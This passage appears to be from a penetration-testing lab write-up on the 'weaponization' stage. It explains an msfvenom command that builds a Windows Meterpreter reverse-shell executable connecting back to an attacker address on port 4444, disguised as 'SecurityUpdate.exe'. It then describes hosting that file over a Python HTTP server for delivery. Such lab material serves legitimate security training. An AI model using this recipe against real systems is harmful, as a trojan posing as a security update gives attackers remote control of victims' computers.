# Weaponization

### Objective: Create a malicious payload and delivery mechanism.

### Action:

1. Use MSFVenom (a tool for creating payloads) to generate a malicious executable that can execute a Meterpreter shell (a Metasploit payload for remote control). 

![image](https://github.com/user-attachments/assets/fc6acd6d-1b8f-4dc9-8d76-ab57a5fc4574)

- Here's a breakdown in simple terms:

  - `msfvenom` – A tool used to generate payloads (malicious code) for penetration testing.
  - `-p windows/meterpreter/reverse_tcp` – This specifies the payload type:
    - `windows/meterpreter/reverse_tcp` is a payload that creates a "reverse shell," meaning the target machine (victim) will connect back to the attacker's computer.
  - `LHOST=10.19.19.134` – The attacker's IP address where the victim's machine will connect.
  - `LPORT=4444` – The port on which the attacker's computer is listening for incoming connections.
  - `-f exe` – Specifies the output format of the payload (in this case, a Windows executable `.exe` file).
  - `-o SecurityUpdate.exe` – Saves the malicious executable file as `SecurityUpdate.exe`.

- The Output:

The tool automatically selects Windows as the target platform.
It picks **x86 (32-bit architecture)** since no specific architecture was mentioned.
No encoding (obfuscation) is applied, so the payload is "raw."
The payload itself is **354 bytes** in size, but the final executable is **73,802 bytes**.
The malicious file is saved as `SecurityUpdate.exe`.

- What This Means:
If someone runs `SecurityUpdate.exe` on a Windows machine, it will create a connection from the victim's computer back to the attacker's system (`10.19.19.134:4444`). This allows the attacker to control the machine remotely using Meterpreter, a powerful post-exploitation tool in Metasploit.

2. Host the payload in a Python HTTP server on port `8000`.

![image](https://github.com/user-attachments/assets/1c66b5c9-4f4c-4285-8f5a-d86b5a14c244)
